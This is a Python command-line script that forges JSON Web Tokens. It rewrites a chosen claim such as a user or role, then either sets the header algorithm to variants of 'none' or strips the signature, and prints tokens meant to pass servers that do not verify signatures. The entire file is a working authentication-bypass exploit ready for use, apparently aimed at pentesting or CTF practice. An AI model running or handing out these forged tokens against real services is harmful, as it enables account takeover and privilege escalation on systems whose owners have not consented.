import re
import base64
from argparse import ArgumentParser


def decode_token_part(token_part):
    for i in range(3):
        try:
            token_part_decoded = base64.urlsafe_b64decode(token_part + "="*i)
            return token_part_decoded.decode()
        except:
            pass
    return False

def modify_token_part(token_part, param, value):
    token_part_decoded = decode_token_part(token_part)
    return re.sub(f'"{param}":".*?"',f'"{param}":"{value}"',token_part_decoded)


def encode_token_part(token_part_decoded):
    return base64.urlsafe_b64encode(token_part_decoded.encode()).decode().rstrip('=')


def none_attack(header, payload, param, value):
    header_decoded = decode_token_part(header)
    payload_decoded = decode_token_part(payload)
    payload_modified_decoded = modify_token_part(payload, param, value)
    payload_modified = encode_token_part(payload_modified_decoded)
    for none in ['none','None','nOnE','NONE']: 
        header_modified_decoded = modify_token_part(header,'alg',none)
        header_modified = encode_token_part(header_modified_decoded)
        print(f'[+] Generated {none} JWT: {header_modified}.{payload_modified}.')


def unverified_signature(header, payload, param, value):
    payload_decoded = decode_token_part(payload)
    payload_modified_decoded = modify_token_part(payload, param, value)
    payload_modified = encode_token_part(payload_modified_decoded)
    print(f'[+] Unverified signature attack: {header}.{payload_modified}.')


if __name__=="__main__":
    argparser = ArgumentParser()
    argparser.add_argument(
        "--token", required = True, type = str
    )
    argparser.add_argument(
        "--param", required = True, type = str
    )
    argparser.add_argument(
        "--value", required = True, type = str
    )
    argparser.add_argument(
        "--method", required = True, type = str
    )
    
    args = argparser.parse_args()
    token = args.token
    param = args.param
    value = args.value
    method = args.method
    
    header, payload, sig = token.strip().split('.')
    
    print(f'[+] Decoded token: {decode_token_part(header)}{decode_token_part(payload)}')
    
    if method.strip().lower() == "none":
        none_attack(header, payload, param, value)
    else:
        unverified_signature(header, payload, param, value)
